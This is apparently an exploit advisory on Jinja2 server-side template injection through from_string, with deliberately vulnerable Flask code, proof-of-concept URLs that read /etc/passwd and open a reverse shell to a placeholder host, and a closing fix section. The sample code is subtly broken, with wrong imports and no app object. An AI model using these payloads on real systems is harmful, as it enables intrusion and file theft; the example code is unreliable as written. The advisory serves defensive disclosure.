<div style="
    text-align: center;
">
<a href="https://ordina.nl" target="_blank"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRBTgtBKmWL2i-76KccY9u0mrxAF9i0bPAJasA2YYeapgsL02AGlg" 
alt="Ordina  Research Lab" /></a>
</div>

#Jinja2 Command injection from_string function <br />
#Website: Ordina.nl <br />
Author: Jameel Nabbo   <br />
Email: jameel.nabbo[at]ordina.nl   <br />
Exploit-DB: https://www.exploit-db.com/exploits/46386 <br />

// from_string function is prone to SSTI where it takes the "source" parameter as a template object and render it and then return it.


//here's an example about the vulnerable code that uses from_string function in order to handle a variable in GET called 'username' and returns Hello {username}:

```python

import Flask
import request
import Jinja2


@app.route("/")
def index():
	username = request.values.get('username')
	return Jinja2.from_string('Hello ' + username).render()


if __name__ == "__main__":
	app.run(host='127.0.0.1' , port=4444)

```


<b>POC</b>
//Exploiting the username param
http://localhost:4444/?username={{4*4}} <br />
OUTPUT: Hello 16

Reading the /etc/passwd <br />
```c
http://localhost:4444/?username={{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
```

Getting a reverse shell 
http://localhost:4444/?username={{ config['RUNCMD']('bash -i >& /dev/tcp/xx.xx.xx.xx/8000 0>&1',shell=True) }}


How to prevent it:
Never let the user provide template content.
Templates are executable code.
Do not execute untrusted inputs such as [Jinja2,] templates.
Instead, pass variables to the ``render()`` method:


```python
import html

@app.route("/")
def index():
    username = request.values.get('username')
    return Jinja2.from_string('Hello  {{username}}').render(
        username=html.escape(username))
```

Note that ``Jinja2.from_string()`` **does not** enable autoescaping because it does not assume that the output is HTML.
Flask's ``render_template_string`` *does* 
autoescape by default:
http://flask.pocoo.org/docs/1.0/templating/#jinja-setup
